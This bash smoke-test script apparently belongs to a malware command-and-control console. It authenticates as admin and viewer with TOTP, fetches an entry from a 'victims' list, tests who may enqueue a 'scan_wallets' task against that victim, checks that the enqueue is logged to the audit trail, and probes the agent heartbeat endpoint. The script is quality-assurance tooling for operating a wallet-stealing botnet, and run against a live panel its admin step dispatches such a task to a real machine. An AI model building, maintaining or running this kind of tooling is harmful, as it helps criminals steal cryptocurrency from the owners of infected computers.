#!/usr/bin/env bash
# End-to-end permission and contract smoke test. Requires: curl, jq, oathtool.
# Usage: BASE=https://c2.example VIEWER_EMAIL=... VIEWER_PASS=... VIEWER_TOTP=... \
#        ADMIN_EMAIL=... ADMIN_PASS=... ADMIN_TOTP=... ./scripts/smoke.sh
set -euo pipefail
BASE="${BASE:-http://127.0.0.1:3000}"
tmp="$(mktemp -d)"
trap 'rm -rf "$tmp"' EXIT

login() {
  local email="$1" pass="$2" totp="$3" jar="$4"
  local code
  code="$(oathtool --totp -b "$totp")"
  curl -fsS -c "$jar" -H 'content-type: application/json' \
    -d "{\"email\":\"$email\",\"password\":\"$pass\",\"totp\":\"$code\"}" \
    "$BASE/api/console/auth/login" | jq -e '.ok == true' >/dev/null
}

login "$ADMIN_EMAIL" "$ADMIN_PASS" "$ADMIN_TOTP" "$tmp/admin.jar"
login "$VIEWER_EMAIL" "$VIEWER_PASS" "$VIEWER_TOTP" "$tmp/viewer.jar"

victim="$(curl -fsS -b "$tmp/admin.jar" "$BASE/api/console/victims?limit=1" | jq -r '.items[0].id')"
[ -n "$victim" ] && [ "$victim" != null ] || { echo 'no victim to test'; exit 1; }

echo -n 'viewer cannot enqueue: '
status="$(curl -s -o "$tmp/out" -w '%{http_code}' -b "$tmp/viewer.jar" \
  -H 'content-type: application/json' -d "{\"victim_ids\":[\"$victim\"],\"name\":\"scan_wallets\"}" \
  "$BASE/api/console/tasks")"
[ "$status" = 403 ] && echo ok || { echo "FAIL ($status)"; cat "$tmp/out"; exit 1; }

echo -n 'viewer cannot delete: '
status="$(curl -s -o "$tmp/out" -w '%{http_code}' -X DELETE -b "$tmp/viewer.jar" \
  "$BASE/api/console/tasks/00000000-0000-4000-8000-000000000000")"
[ "$status" = 403 ] && echo ok || { echo "FAIL ($status)"; exit 1; }

echo -n 'viewer can read: '
curl -fsS -b "$tmp/viewer.jar" "$BASE/api/console/dashboard" | jq -e '.counters.total >= 1' >/dev/null && echo ok

echo -n 'operator enqueue is audited: '
task="$(curl -fsS -b "$tmp/admin.jar" -H 'content-type: application/json' \
  -d "{\"victim_ids\":[\"$victim\"],\"name\":\"scan_wallets\",\"params\":{}}" \
  "$BASE/api/console/tasks" | jq -r '.items[0].id')"
[ -n "$task" ] && [ "$task" != null ] || { echo 'no task'; exit 1; }
curl -fsS -b "$tmp/admin.jar" "$BASE/api/console/audit?q=task.enqueue&limit=5" | jq -e '.items | length > 0' >/dev/null && echo ok

echo -n 'agent rejects unsigned heartbeat: '
status="$(curl -s -o /dev/null -w '%{http_code}' -H 'content-type: application/json' -d '{}' "$BASE/api/v1/hb")"
[ "$status" = 401 ] && echo ok || { echo "FAIL ($status)"; exit 1; }

echo -n 'health: '
curl -fsS "$BASE/api/console/health" | jq -e '.ok == true' >/dev/null && echo ok

echo 'all checks passed'
